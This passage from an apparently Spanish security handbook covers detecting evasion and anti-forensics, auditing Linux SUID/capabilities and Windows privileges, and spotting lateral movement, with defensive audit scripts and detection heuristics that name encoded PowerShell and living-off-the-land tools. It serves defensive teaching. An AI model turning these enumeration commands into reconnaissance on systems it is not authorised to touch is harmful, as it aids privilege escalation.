* **Anti-forense:** acciones para dificultar la recolección de evidencia: alterar timestamps, borrar logs, eliminar artefactos, sobrescribir archivos, limpiar registros de ejecución, cifrar o fragmentar evidencias.
* **Living-off-the-land (LOTL):** uso de herramientas presentes en el sistema (PowerShell, certutil, regsvr32, curl, bash, etc.) para realizar tareas maliciosas sin bajar herramientas externas — reduce “ruido” y aparenta actividad legítima.

Importante: estos términos describen el comportamiento que los defensores deben detectar y mitigar; no son instrucciones para atacantes.

---

## 2. Indicadores de compromiso y señales a vigilar

En lugar de técnicas ofensivas, aquí tienes señales que apuntan a intentos de evasión/anti-forensic:

### Señales en el endpoint (host)

* Procesos inusuales hijos de procesos legítimos (p. ej. cmd/powershell bajo explorer.exe con argumentos no habituales).
* Procesos con líneas de comando extrañas, especialmente uso de encodings largos (base64) o flags que indican ejecución en memoria.
* Ejecutables o scripts que aparecen en directorios temporales o con nombres que imitan binarios del sistema.
* Frecuentes arranques de herramientas de administración (p.ej. `wmic`, `schtasks`, `powershell`) fuera de horas/reglas normales.
* Borrado rápido de logs (event logs con gaps), o gaps en los logs de EDR/agent.
* Modificaciones de la configuración de logging, cambios en Sysmon, o deshabilitación de agentes de seguridad.
* Archivos binarios con firmas/certificados no válidos o recién introducidos en rutas de sistema.

### Señales en la red

* Tráfico TLS persistente a destinos no habituales, patrones de beaconing (intervalos regulares).
* Tráfico cifrado a puertos no estándar o a hosts nuevos en listas de destinos.
* Exfiltración de datos en pequeños fragmentos o empaquetado inusual (multipart uploads, DNS exfiltration attempts signs).
* Uso inusual de protocolos legítimos para túneles (DNS, ICMP, HTTP(S) con long polling).

### Señales en la telemetría central

* Discrepancias entre registros de distintos sistemas (p. ej. EDR reporta proceso, pero Sysmon no; logs faltantes).
* Elevados volúmenes de “false negatives” o eventos silenciados por políticas.
* Alertas de integridad de ficheros que muestran modificaciones y luego reversión.

---

## 3. Controles defensivos y buenas prácticas (arquitectura + configuración)

### Endpoint (EDR / Sysmon / logging)

* **Telemetría mínima obligatoria:** registrar creación de procesos (con command line), creación de servicios, carga de drivers, creación/eliminación de scheduled tasks, cambios en Run keys y creación de archivos ejecutables en directorios no habituales.
* **Sysmon configuration:** habilitar eventos clave — ProcessCreate, CreateRemoteThread, ImageLoad, DriverLoad, DNS query logging (cuando sea posible), FileCreateTime, and Registry changes. Usa una configuración tuned (amply documented templates exist) y mantén el XML actualizado.
* **Command line logging:** habilitar para procesos críticos (PowerShell, wscript, cmd). PowerShell ScriptBlock logging y Module logging (Windows) son críticos.
* **Tamper protection:** proteger la configuración del agente EDR y sus ejecutables contra modificación o desactivación por usuarios no autorizados.
* **Restricciones de PowerShell:** Aplica Constrained Language Mode y aplica controles de AMSI/ScriptBlock logging.
* **Least privilege:** reducir el número de cuentas capaces de ejecutar comandos administrativos, bloquear ejecución de intérpretes por cuentas sin necesidad.
* **Application control / whitelisting:** AppLocker, WDAC o soluciones similares para reducir ejecución de binarios no autorizados.

### Red y perímetro

* **Egress filtering:** filtrar salidas hacia Internet, permitir sólo destinos aprobados; bloquear salidas directas a IPs no registradas.
* **TLS inspection / proxying:** cuando sea viable, inspeccionar salidas HTTPS corporativas para detectar beacons anómalos (respetando políticas de privacidad/regulaciones).
* **Network detection:** emplear IDS/IPS (Suricata/Zeek) con reglas orientadas a beaconing y exfil patterns; detección de cambios de perfil de host.

### SIEM / Correlación

* **Normalize telemetry:** centralizar eventos (Sysmon, EDR, network logs) y crear correlaciones para detectar patterns (procesos + network + file changes).
* **Baselining & anomaly detection:** establecer comportamiento normal (hosts, services, hours) y alertar desviaciones (machine learning / statistical baselines).
* **Retention & integrity:** almacenar logs en sistemas inmutables cuando sea necesario y proteger su integridad (WORM/append-only).

---

## 4. Detección práctica: reglas y heurísticas (ejemplos conceptuales)

A continuación reglas de detección conceptuales que puedes implementar en SIEM/EDR. No incluyo PoC que enseñen evasión; las reglas ayudan a detectar comportamiento sospechoso.

* **Heurística 1 — Parent-child mismatch:** si un proceso con UI (explorer, svchost) lanza cmd/powershell con línea de comando que contiene “encodedCommand”, “IEX”, o base64 largos, aumentar score.
* **Heurística 2 — Script activity outside dev hours:** PowerShell/Script execution on user desktops outside work hours → suspicious.
* **Heurística 3 — Process spawns network beacon shortly after creation:** correlate ProcessCreate events with network outbound events within X seconds.
* **Heurística 4 — File creation + deletion gaps:** file created under /tmp or %TEMP%, then quickly deleted and logs show gaps → flag for triage.
* **Heurística 5 — Multiple account password resets or privilege escalations combined with scheduled task changes → high severity.**

Puedes traducir estas heurísticas a reglas concretas en tu SIEM (Elastic, Splunk, QRadar): combinar campos `process.name`, `process.parent.name`, `process.command_line`, `network.destination.ip`, `file.path`, `registry.path` con ventanas temporales cortas (1–5 min) para correlación.

---

## 5. Investigaciones forenses: qué recolectar y cómo analizar

**Orden recomendado al investigar sospecha de evasión/anti-forensics** (priorizar electric evidence collection before change):

1. **Preservación e imagen forense:** si es un host crítico o el caso legal lo requiere, tomar imagen de memoria y disco antes de modificar.
2. **Recolección de telemetría:** exportar eventos relevantes de Sysmon/Windows Event Log/EDR; hacer volcado de procesos sospechosos.
3. **Red logs:** capturar pcap de periodos relevantes; exportar logs de proxy y firewall.
4. **Artefactos en disco:** recoger binarios, scripts, scheduled tasks definitions, systemd units, entries en crontab, Run keys y registros de creación/modificación de ficheros.
5. **Timestamps cross-validation:** comparar timestamps de sistema de ficheros con metadatos del MFT (Windows) o inodes/ctime/mtime/atime (Linux) — buscar inconsistencias que sugieran manipulación.
6. **Análisis de memoria:** buscar procesos inyectados, shellcode en memoria, conexiones de sockets en procesos inesperados.
7. **Correlación temporal:** alinear eventos de proceso, red y logs para reconstruir la secuencia.
8. **Hashing y preserving evidence chain:** calcular hash SHA256/SHA1 de artefactos y anotar cadena de custodia.

**Herramientas recomendadas para IR y forense:** Volatility/Volatility3, Rekall, FTK Imager, Autopsy, Velociraptor, Timesketch, Zeek, Suricata, Wireshark.

---

## 6. Remediación y lecciones aprendidas

* **Containment:** aislar host(s) comprometidos (quarantine VLAN), bloquear cuentas comprometidas y endpoints de egress.
* **Eradication:** eliminar artefactos detectados, reinstalar desde golden image si el grado de compromiso es alto o incierto.
* **Recovery:** restaurar sistemas, rotar credenciales y claves, re-deploy patches y reforzar controles.
* **Lessons learned:** actualizar detecciones (SIEM rules, YARA/EDR signatures), mejorar hardening, capacitar equipos.
* **Post-mortem:** documentar la línea temporal, impacto, vectores y mitigaciones aplicadas.

---

## 7. Ejercicios de laboratorio seguros (blue team training)

Objetivo: entrenar detección sin enseñar ofuscación ni técnicas ofensivas concretas.

### Ejercicio A — Simular beaconing con herramientas controladas

* En red aislada, genera tráfico “beacon-like” desde hosts de laboratorio usando herramientas que claramente marquen la prueba (por ejemplo, scripts que hagan conexiones HTTP GET a URLs lab-controladas cada N segundos).
* Blue Team debe crear detecciones de periodicidad, agrupar por host y bloquear egress sospechoso.
* No se usan técnicas de ofuscación ni ejecución en memoria.

### Ejercicio B — Simular anti-forensic artifacts (file timestamps mismatch dataset)

* Prepara un dataset de “artefactos simulados” donde ciertos archivos tengan timestamps alterados artificialmente (útil para entrenamiento de analistas). No enseñas cómo alterar timestamps en producción; sólo proporcionas dataset.
* Los analistas deben detectar inconsistencias entre MFT, syslog, y registros de backup.

### Ejercicio C — Simulated living-off-the-land (LOTL) behaviour at high level

* Usa logs sintéticos que muestren uso intensivo y anómalo de PowerShell/Certutil/curl desde un host.
* Los equipos de detección deben desarrollar reglas para distinguir uso legítimo (administration windows, known maintenance scripts) de patrones anómalos (scripts invocados por cuentas no autorizadas, línea de comando con long encoded payloads).

Estos ejercicios entrenan la detección sin enseñar a ocultar actividad.

---

## 8. Plantillas y artefactos defensivos que puedo generar

Puedo prepararte (y guardarlos en `/mnt/data` si querés descargar):

* Plantilla Sysmon XML enfocada en detección de evasión (eventos a capturar y comentarios) — **defensiva**.
* Un conjunto de heurísticas traducidas a reglas de SIEM (pseudocódigo) para Elastic/Splunk/QRadar — orientadas a detección, no a evasion.
* Script safe (read-only) para recolectar artefactos de evidencia (exportar eventos, listar servicios/tasks, verificar integridad de logs) — pensado para IR; **solo lectura**.
* Guion de ejercicio de laboratorio (playbook) para entrenar Blue Teams con datasets simulados (beacons, artefactos con timestamps inconsistentes, logs sintéticos).

Dime cuál de esos artefactos defensivos querés y lo preparo.

---

## 9. Checklist rápido para defenderse de evasión y anti-forensics

* [ ] Telemetría endpoint completa (process create + command line + image load).
* [ ] PowerShell logging (ScriptBlock, Module, Transcription) habilitado.
* [ ] Sysmon instalado y bien configurado (ProcessCreate, CreateRemoteThread, ImageLoad, DNS).
* [ ] Egress filtering y proxying aplicados.
* [ ] Tamper protection para los agentes de seguridad activada.
* [ ] SIEM con reglas de correlación basadas en heurísticas presentadas.
* [ ] Playbooks de IR con steps definidos para preservación, análisis y remediación.
* [ ] Programas de formación/red team vs blue team regulares con datasets controlados.

---

## Referencias y lecturas recomendadas (defensa y forense)

* Documentación oficial de Sysmon (Microsoft) y recomendaciones de configuración.
* Publicaciones de SANS sobre digital forensics e incident response.
* Artículos de Velociraptor, Timesketch, Volatility para análisis de memoria.
* Whitepapers de proveedores EDR sobre detección de living-off-the-land.
* Guías de hardening de CIS Benchmarks.

---

# Capítulo 26 — Elevación de privilegios en Linux

**SUID, capabilities y vulnerabilidades locales (detección y mitigación ética)**

---

## Objetivos

* Comprender qué mecanismos permiten ejecutar procesos con privilegios elevados.
* Detectar configuraciones inseguras (SUID, capabilities, permisos incorrectos).
* Diseñar scripts defensivos que auditen un sistema Linux en busca de riesgos.
* Aplicar medidas de mitigación y buenas prácticas para prevenir explotación local.

> **Aviso ético-legal:** Este capítulo **no enseña explotación** ni uso ofensivo de vulnerabilidades locales. Todos los ejemplos y scripts están orientados a **auditoría y hardening** de sistemas Linux de forma legal y responsable.

---

## 1. Conceptos fundamentales

### SUID y SGID

El **bit SUID (Set User ID)** permite que un ejecutable se ejecute con los privilegios del propietario del archivo, en lugar del usuario que lo ejecuta.
Ejemplo legítimo:

* `/usr/bin/passwd` necesita modificar `/etc/shadow`, un archivo que sólo `root` puede editar.
* Por eso, `passwd` tiene el bit SUID activo, permitiendo a los usuarios cambiar su contraseña sin ser root.

**Riesgo:** si un binario con SUID contiene fallos (buffer overflows, inyecciones, etc.), puede ser aprovechado para ejecutar código con privilegios root.

El bit **SGID** (Set Group ID) hace lo mismo a nivel de grupo.

---

### Capabilities (capabilidades POSIX)

Linux introdujo “capabilities” para dividir privilegios de root en permisos más pequeños, como `CAP_NET_ADMIN`, `CAP_SYS_PTRACE`, etc.
Esto permite que un binario tenga solo ciertos privilegios sin ser root completo.

**Riesgo:** si un ejecutable tiene capabilities innecesarias, un atacante puede usarlas para realizar acciones privilegiadas.

Comando útil (solo lectura):

```bash
getcap -r / 2>/dev/null
```

Lista binarios con capacidades asignadas, permitiendo auditar el sistema.

---

### Escalada local de privilegios

Consiste en aprovechar configuraciones inseguras o vulnerabilidades locales para pasar de usuario limitado a root.
**Ejemplos de vector (solo para análisis defensivo):**

* Binarios con SUID que invocan comandos externos.
* Capabilities mal asignadas.
* Scripts con permisos 777 en rutas compartidas.
* Vulnerabilidades del kernel o librerías desactualizadas.

**No abordaremos exploits ni payloads**, sino cómo detectarlos y prevenirlos.

---

## 2. Auditoría ética: qué revisar en Linux

Un auditor defensivo debe buscar:

| Elemento                 | Riesgo                            | Herramienta de inspección                |
| ------------------------ | --------------------------------- | ---------------------------------------- |
| Archivos con SUID/SGID   | Ejecución privilegiada            | `find / -perm -4000 -type f 2>/dev/null` |
| Capabilities asignadas   | Privilegios parciales             | `getcap -r / 2>/dev/null`                |
| Archivos world-writable  | Modificación por usuarios no root | `find / -perm -2 -type f 2>/dev/null`    |
| Cronjobs del sistema     | Scripts ejecutados por root       | `cat /etc/crontab`                       |
| Configuración de sudoers | Escaladas indirectas              | `sudo -l` (bajo cuentas autorizadas)     |

---

## 3. Script Python defensivo — “PrivAudit Linux Checker”

A continuación, un **auditor ético** en Python. No explota nada: lista y guarda resultados de seguridad para revisión.

```python
#!/usr/bin/env python3
"""
PrivAudit Linux Checker
Versión: 1.0 (uso defensivo)
Audita SUID, SGID y capabilities en busca de riesgos potenciales.
Guarda resultados en JSON.
"""

import os, subprocess, json, time

report = {
    "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
    "suid_files": [],
    "sgid_files": [],
    "capabilities": [],
}

def run(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)
        return result.strip().splitlines()
    except subprocess.CalledProcessError:
        return []

print("[+] Auditando archivos SUID...")
for line in run("find / -perm -4000 -type f 2>/dev/null"):
    report["suid_files"].append(line)

print("[+] Auditando archivos SGID...")
for line in run("find / -perm -2000 -type f 2>/dev/null"):
    report["sgid_files"].append(line)

print("[+] Auditando capabilities...")
for line in run("getcap -r / 2>/dev/null"):
    report["capabilities"].append(line)

with open("privaudit_report.json", "w", encoding="utf-8") as f:
    json.dump(report, f, indent=2)

print("\n[✔] Auditoría completada. Resultados en privaudit_report.json")
```

**Uso recomendado (solo lectura):**

```bash
sudo python3 privaudit.py
```

Genera un reporte con todos los binarios con SUID/SGID o capabilities para análisis manual.
Nunca ejecuta ni modifica archivos.

---

## 4. Mitigación y hardening

**Linux general:**

* Revisa periódicamente los binarios SUID y remueve el bit en los que no lo necesiten.
* Revisa capabilities con `getcap` y elimina permisos innecesarios con `setcap -r /path/binario`.
* Actualiza kernel y librerías frecuentemente.
* Implementa auditorías con `auditd` o `osquery` para detectar creación/modificación de SUID.
* Activa AppArmor o SELinux en modo enforcing.
* Usa herramientas de baseline (Tripwire, AIDE) para detectar nuevos binarios privilegiados.

**Ciclo de mantenimiento recomendado:**

1. Ejecutar `PrivAudit` cada mes.
2. Revisar binarios con SUID recién agregados.
3. Validar que pertenecen a paquetes del sistema (`dpkg -S /ruta/binario`).
4. Notificar si provienen de usuarios o scripts no autorizados.
5. Generar informe y aplicar correcciones.

---

## 5. Ejercicio de laboratorio ético

Configura dos máquinas virtuales:

* **VM1 (Auditor):** ejecuta `PrivAudit` para recolectar SUID/capabilities.
* **VM2 (Sistema auditado):** instala Linux básico con cuentas de usuario simuladas.

Ensayo:

1. Ejecuta el auditor y revisa el reporte.
2. Introduce un archivo con SUID manualmente (bajo permiso y propósito didáctico).
3. Repite la auditoría y observa la detección.
4. Aplica remediación (`chmod u-s archivo`).
5. Documenta el proceso y presenta evidencia de mejora.

Esto enseña detección y corrección **sin explotación ni escalada real**.

---

## 6. Respuesta ante hallazgos

Si detectas archivos sospechosos:

* Analiza su hash y origen (`dpkg -S` o `rpm -qf`).
* Si no pertenece a un paquete oficial, mueve el archivo a cuarentena.
* Investiga logs (`/var/log/auth.log`, `/var/log/audit/audit.log`).
* Comprueba si el archivo fue creado recientemente (`ls -l --time=ctime`).
* Evalúa reinstalar el paquete o el sistema si hay compromiso.

---

## 7. Checklist de seguridad (resumen)

* [ ] Ejecutar auditoría SUID/SGID mensual.
* [ ] Revisar capabilities en binarios no estándar.
* [ ] Validar permisos de scripts y cronjobs.
* [ ] Usar AppArmor/SELinux activos.
* [ ] Auditar logs de creación/modificación de binarios privilegiados.
* [ ] Mantener inventario de binarios SUID permitidos.
* [ ] Documentar todos los hallazgos.

---

## 8. Lecturas y herramientas complementarias

* **Lynis:** auditoría avanzada de seguridad en Linux.
* **osquery:** permite consultar artefactos de persistencia y permisos con SQL.
* **AIDE:** integridad de archivos.
* **Auditd:** detección en tiempo real de cambios de permisos.
* **CIS Benchmarks para Linux.**

---

## Conclusión

La elevación de privilegios no siempre depende de vulnerabilidades complejas; muchas veces surge de configuraciones incorrectas o descuidos. Este capítulo enseña cómo detectarlas, mitigarlas y documentarlas responsablemente, sin explotación ni riesgo.
El mejor Red Teamer o administrador no es quien escala privilegios, sino quien asegura que nadie pueda hacerlo sin autorización.

---

# Capítulo 27 — Elevación de privilegios en Windows

**UAC, tokens y vulnerabilidades locales (detección, mitigación y respuesta)**

---

## Objetivos

* Comprender los mecanismos de privilegios y control de acceso en Windows.
* Identificar configuraciones inseguras o software vulnerable.
* Aprender cómo detectar intentos de bypass o abuso de tokens.
* Construir herramientas defensivas (auditoría de privilegios) y playbooks para respuesta ante incidentes.

> **Aviso ético-legal:** Este capítulo no incluye exploits ni PoCs que modifiquen el sistema o eleven privilegios. Todos los ejemplos son **de auditoría y monitoreo**.

---

## 1. Arquitectura de privilegios en Windows

### Niveles de privilegio

1. **User Mode:** el contexto normal de ejecución para la mayoría de los procesos.
2. **Administrator Mode:** acceso extendido a configuraciones y servicios.
3. **System (NT AUTHORITY\SYSTEM):** máximo privilegio local; utilizado por servicios del sistema operativo.

Windows separa privilegios mediante **Access Tokens**, que contienen identificadores de usuario (SIDs), grupos y privilegios asignados.

---

### UAC (User Account Control)

UAC busca evitar que un usuario administrador ejecute tareas privilegiadas sin confirmación.
Cuando se eleva un proceso, se crea un **Access Token elevado** con permisos ampliados.
**Riesgos comunes:**

* Usuarios con privilegios administrativos que deshabilitan UAC.
* Aplicaciones mal configuradas que solicitan elevación innecesaria.
* Firmas digitales inválidas o aplicaciones en listas blancas sin control.

---

## 2. Auditoría ética: detección de debilidades de privilegio

### Puntos críticos a revisar

| Elemento                         | Riesgo                                                     | Herramienta/Comando de inspección                                                    |
| -------------------------------- | ---------------------------------------------------------- | ------------------------------------------------------------------------------------ |
| Nivel de UAC                     | Configuración débil                                        | `Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"` |
| Grupos locales                   | Usuarios en Administradores                                | `net localgroup Administrators`                                                      |
| Privilegios sensibles            | Token con privilegios de alto impacto                      | `whoami /priv`                                                                       |
| Servicios                        | Ejecutan como SYSTEM pero modificables                     | `sc qc <service>`                                                                    |
| Permisos en archivos binarios    | Usuarios con control total sobre ejecutables privilegiados | `icacls "C:\path\file.exe"`                                                          |
| Versiones de Windows sin parches | Vulnerabilidad local conocida                              | `systeminfo` + KB comparison                                                         |

---

## 3. Script defensivo — Windows Privilege Audit

Este script (PowerShell) revisa configuraciones sensibles, niveles de UAC, privilegios y servicios inseguros.
**No eleva privilegios ni modifica el sistema.**

```powershell
<#
Windows Privilege Audit
Versión: 1.0 (defensivo)
Audita configuraciones de UAC, grupos administrativos y privilegios sensibles.
#>

Write-Host "=== Windows Privilege Audit ===`n"

# Configuración de UAC
$uac = Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
Write-Host "[UAC Settings]"
$uac | Select-Object ConsentPromptBehaviorAdmin, EnableLUA | Format-Table

# Grupos administrativos
Write-Host "`n[Local Administrators]"
net localgroup Administrators

# Privilegios del usuario actual
Write-Host "`n[Current Token Privileges]"
whoami /priv

# Servicios ejecutados como SYSTEM
Write-Host "`n[Services running as SYSTEM]"
Get-WmiObject win32_service | Where-Object { $_.StartName -eq "LocalSystem" } | Select Name, PathName | Format-Table -AutoSize

# Version info
Write-Host "`n[System Version]"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

Guarda el resultado de este script como evidencia periódica de auditoría.

---

## 4. Indicadores de intento de escalada

* Cambios en claves de registro asociadas a UAC (`EnableLUA`, `ConsentPromptBehaviorAdmin`).
* Creación de servicios nuevos que apuntan a binarios fuera de `C:\Windows\System32`.
* Procesos que heredan tokens de otros procesos privilegiados.
* Módulos DLL no firmados cargados en servicios del sistema.
* Archivos con permisos excesivos (`FullControl` para grupos no administrativos).
* Logs de “Privilege escalation attempt” o “Token impersonation” en el visor de eventos (ID 4672, 4673, 4674).

---

## 5. Detección y mitigación práctica

### a) Monitoreo

* **Sysmon**

  * Event ID 1: Process creation (command line, parent).
  * Event ID 7: Image loaded (DLL).
  * Event ID 11: File creation (nuevo ejecutable).
  * Event ID 13/14: Registry modifications.
* **EDR/AV:** revisar reglas específicas para detección de procesos inyectados o herencia de tokens.

### b) Hardening

* Activar **UAC en modo Always Notify** (`EnableLUA=1`).
* Aplicar **LAPS (Local Administrator Password Solution)** para contraseñas únicas por host.
* Usar **AppLocker / WDAC** para limitar ejecución de binarios no firmados.
* Auditar permisos de servicios:

  * Asegurarse de que `StartName` sea SYSTEM o una cuenta de servicio legítima.
  * Revocar permisos de escritura a usuarios estándar en `PathName`.
* Evitar ejecutar servicios o tareas con credenciales administrativas globales.
* Mantener el sistema actualizado con parches críticos (especialmente de escalada local).

---

## 6. Tokens y privilegios sensibles

**Tipos de privilegios críticos a vigilar:**

* `SeImpersonatePrivilege`: permite impersonar usuarios; alto riesgo.
* `SeDebugPrivilege`: permite acceder a procesos de otros usuarios.
* `SeLoadDriverPrivilege`: cargar drivers arbitrarios.
* `SeBackupPrivilege` / `SeRestorePrivilege`: acceso a cualquier archivo.

### Auditoría

```powershell
whoami /priv | findstr "Enabled"
```

Cualquier token con estos privilegios habilitados requiere justificación y control.

---

## 7. Playbook de respuesta ante intento de escalada

| Fase                        | Acción                                                      | Herramienta          |
| --------------------------- | ----------------------------------------------------------- | -------------------- |
| **1. Detección**            | Analizar logs Sysmon y Event Viewer (IDs 4672, 4673, 7045)  | SIEM                 |
| **2. Contención**           | Aislar host en red y revocar credenciales comprometidas     | EDR/SOAR             |
| **3. Análisis**             | Dump de procesos, revisar servicios nuevos, comparar hashes | Volatility, Autoruns |
| **4. Erradicación**         | Eliminar servicios/tasks no autorizados                     | PowerShell/SC        |
| **5. Recuperación**         | Reinstalar binarios legítimos, aplicar GPO de hardening     | SCCM, Intune         |
| **6. Lecciones aprendidas** | Actualizar reglas, reforzar política de privilegios mínimos | SIEM/EDR             |

---

## 8. Ejercicios de laboratorio éticos

1. **Simulación de detección UAC:**

   * Modificar valor de `EnableLUA` en un entorno de prueba y observar eventos generados por Sysmon/Event Viewer.
   * Aprender a alertar automáticamente sobre ese cambio.

2. **Simulación de privilegios excesivos:**

   * Crear una cuenta de laboratorio con `SeDebugPrivilege` habilitado.
   * Verificar que tu auditoría y SIEM lo detecten.

3. **Prueba de integridad de servicios:**

   * Configura un servicio de prueba que cambie el `PathName`, y observa si el script defensivo lo registra.

---

## 9. Checklist de seguridad

* [ ] UAC activado (`EnableLUA=1`).
* [ ] LAPS implementado en todos los endpoints.
* [ ] Sysmon desplegado con reglas de detección para escalada.
* [ ] PowerShell Logging habilitado.
* [ ] Revisar membresía del grupo Administradores semanalmente.
* [ ] Aplicar principio de privilegio mínimo.
* [ ] Parches críticos actualizados.
* [ ] Auditorías periódicas con script de verificación.

---

## 10. Lecturas y recursos recomendados

* **Microsoft Defender for Endpoint documentation** — detección de técnicas de UAC bypass y token abuse.
* **MITRE ATT&CK Framework (T1068, T1548)** — técnicas de escalada locales.
* **Sysinternals Suite:** `Autoruns`, `Procmon`, `AccessChk`, `PsExec`.
* **CIS Benchmarks for Windows Security.**
* **SANS DFIR resources:** Windows privilege auditing and IR playbooks.

---

## Conclusión

La escalada de privilegios en Windows es una de las fases más críticas en cualquier ejercicio de Red Team o auditoría defensiva. Con las herramientas adecuadas y una política de privilegios mínimos, es posible prevenir y detectar la mayoría de los intentos de bypass o abuso de tokens. Este capítulo te brinda el marco necesario para hacerlo de forma ética, legal y efectiva.

---

# Capítulo 28 — Movimiento lateral en entornos corporativos

**Pass-the-Hash, Pass-the-Ticket y otros vectores: detección, mitigación y auditoría**

---

## Objetivos

* Comprender los mecanismos de autenticación y cómo pueden ser abusados para moverse lateralmente.
* Identificar artefactos característicos del uso de hashes NTLM o tickets Kerberos robados.
* Diseñar estrategias de **detección y mitigación** frente a movimiento lateral.
* Implementar auditorías y scripts **defensivos** que recolecten evidencia y alertas sin manipular credenciales.

> **Aviso ético-legal:** Ningún procedimiento de este capítulo implica ni enseña la obtención o el uso de credenciales ajenas. Los ejemplos están diseñados para **defensa, detección y respuesta** en entornos con consentimiento.

---

## 1. Conceptos fundamentales

### Autenticación en Windows

* **NTLM** (NT LAN Manager) usa hashes de contraseñas. Un atacante que obtiene un hash NTLM puede intentar reutilizarlo en otra máquina (Pass-the-Hash).
* **Kerberos** usa tickets (`TGT`, `TGS`) cifrados con claves derivadas de la contraseña del usuario. Si se roba un ticket, puede reutilizarse (Pass-the-Ticket).
* **Credenciales almacenadas:** Windows guarda hashes y tickets temporalmente en LSASS para permitir Single Sign-On. Proteger este proceso es clave.

### Movimiento lateral

Proceso mediante el cual un actor pasa de un host comprometido a otro aprovechando credenciales, sesiones o accesos de red legítimos.
Ejemplos comunes (conceptuales):

* Reutilizar credenciales de administrador local compartidas.
* Usar conexiones administrativas (SMB, WMI, RPC, WinRM).
* Impersonar usuarios en sesiones existentes.

---

## 2. Superficie de ataque y vectores comunes

| Vector conceptual                         | Descripción                                         | Señales de alerta                                                       |
| ----------------------------------------- | --------------------------------------------------- | ----------------------------------------------------------------------- |
| **Pass-the-Hash**                         | Reutilización de hashes NTLM.                       | Logons tipo 3 seguidos de autenticaciones NTLM anómalas.                |
| **Pass-the-Ticket**                       | Reutilización de tickets Kerberos.                  | Eventos 4769/4624 con Ticket Encryption Type inusual o mismatched.      |
| **Remote Service Creation (PsExec-like)** | Creación de servicio remoto para ejecutar comandos. | Event 7045 (Service created), conexiones SMB 445.                       |
| **WMI/WinRM**                             | Ejecución remota por interfaces administrativas.    | Event 4688 (process creation wmi/prvsvc), 4728/4732 (group membership). |
| **Admin Shares**                          | Uso de C$, ADMIN$, IPC$ para moverse.               | Sesiones SMB con share administrativo.                                  |

---

## 3. Indicadores de compromiso (IOCs)

### Logs y eventos

* **4624/4625:** Logons exitosos/fallidos; observar `Logon Type 3 o 9`.
* **4672:** Uso de privilegios especiales.
* **4768/4769:** Solicitud y entrega de tickets Kerberos.
* **7045:** Creación de nuevo servicio (indicador de PsExec-like).
* **Sysmon Event 1/3:** Creación de procesos y conexiones de red.

### Huellas en red

* Conexiones SMB/WMI frecuentes entre hosts no relacionados.
* Tráfico Kerberos inusual fuera del dominio esperado.
* Beaconing o repetición de autenticaciones fallidas.

### Artefactos de sistema

* Archivos ejecutables en `C:\Windows\Temp\` o `\\ADMIN$\`.
* Servicios recién creados con nombres genéricos.
* Scripts temporales o logs en perfiles de usuario con timestamps cercanos a la intrusión.

---

## 4. Estrategias de mitigación

### Autenticación y credenciales

* **Deshabilitar NTLM si es posible** o restringirlo mediante políticas (`Network security: Restrict NTLM`).
* Implementar **Kerberos only** en dominios modernos.
* Aplicar **LAPS (Local Administrator Password Solution)**: cada máquina con contraseña única.
* Habilitar **Credential Guard** y **LSASS Protection** (RunAsPPL).
* Usar **MFA (autenticación multifactor)** para logins administrativos.
* Limitar cuentas administrativas: usar cuentas separadas por nivel (workstation, server, domain).

### Red y segmentación

* **Firewalling interno:** bloquear SMB (445), RPC/WMI (135-139) entre segmentos.
* **Egress control:** restringir conexiones salientes desde servidores críticos.
* **Network Access Control (NAC)** para evitar dispositivos no autorizados.

### Monitorización

* Implementar **Sysmon** con reglas para correlacionar `ProcessCreate` + `NetworkConnect`.
* Correlacionar eventos 4624 + 7045 + 4688 para detectar servicios remotos anómalos.
* SIEM rules: detectar “multiple logons same account different hosts < 5 min”.

---

## 5. Script defensivo — “LateralMove Auditor” (PowerShell)

Este script **no explota** nada; sólo recolecta evidencia de posibles movimientos laterales.

```powershell
<#
LateralMove Auditor v1.0
Propósito: auditar logs de eventos y servicios sospechosos.
#>

$events = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} -MaxEvents 2000 |
    Where-Object {$_.Properties[8].Value -eq 3 -or $_.Properties[8].Value -eq 9} |
    Select-Object TimeCreated, @{n='User';e={$_.Properties[5].Value}},
                  @{n='IP';e={$_.Properties[18].Value}}

Write-Host "`n[Logons Type 3/9 recientes]" -ForegroundColor Cyan
$events | Sort-Object TimeCreated -Descending | Select-Object -First 10

Write-Host "`n[Servicios creados recientemente]" -ForegroundColor Cyan
Get-WinEvent -FilterHashtable @{LogName='System'; Id=7045} -MaxEvents 50 |
    Select-Object TimeCreated, Message | Format-List

Write-Host "`n[Resumen privilegios de token actual]" -ForegroundColor Cyan
whoami /priv
```

Ejecutado con permisos de auditoría, este script ayuda a identificar patrones que podrían indicar Pass-the-Hash, servicio remoto o abuso de privilegios.

---

## 6. Playbook de respuesta ante movimiento lateral

| Fase                       | Acción                                                                 | Herramienta                        |
| -------------------------- | ---------------------------------------------------------------------- | ---------------------------------- |
| **1 Detección**            | Correlacionar eventos 4624, 7045, 4688 entre hosts.                    | SIEM, Sysmon                       |
| **2 Contención**           | Aislar los equipos involucrados, revocar credenciales comprometidas.   | EDR/SOAR                           |
| **3 Análisis**             | Extraer memoria (LSASS dump controlado), comparar hashes con baseline. | Volatility / ProcDump (autorizado) |
| **4 Erradicación**         | Reset de contraseñas de dominio, limpieza de tickets Kerberos.         | AD Admin Tools                     |
| **5 Recuperación**         | Revisar GPO, aplicar segmentación y políticas NTLM/Kerberos.           | Group Policy                       |
| **6 Lecciones aprendidas** | Actualizar reglas de detección, ajustar alertas de correlación.        | SIEM                               |

---

## 7. Ejercicios de laboratorio éticos

1. **Simulación de autenticaciones anómalas:**
   Generar logons tipo 3 y 9 desde estaciones de prueba (con cuentas de laboratorio) y verificar si el SIEM los correlaciona.
   No reutilizar hashes reales; crear cuentas dummy con contraseñas triviales en entorno cerrado.

2. **Monitorización de tickets Kerberos:**
   Configurar auditoría avanzada (`Audit Kerberos Service Ticket Operations`) y observar eventos 4768/4769.
   Analizar la frecuencia normal de solicitudes y establecer umbrales.

3. **Ejercicio de respuesta rápida:**
   Simular detección de servicio nuevo (evento 7045) y practicar los pasos del playbook: aislamiento, análisis y erradicación.

---

## 8. Checklist de seguridad

* [ ] NTLM restringido o deshabilitado.
* [ ] LAPS implementado.
* [ ] Credential Guard activo.
* [ ] Sysmon con reglas para ProcessCreate y NetworkConnect.
